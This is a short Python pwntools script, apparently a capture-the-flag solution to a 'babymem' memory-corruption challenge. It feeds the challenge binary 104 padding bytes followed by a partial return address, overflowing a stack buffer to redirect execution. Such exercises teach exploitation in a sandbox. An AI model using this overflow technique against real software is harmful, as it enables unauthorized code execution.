import pwn
r = pwn.process("/challenge/babymem_level3.0")
r.sendline("1024")
r.send(b'\x00'*104+b'\xba\x1c\x40')
print(r.readall())
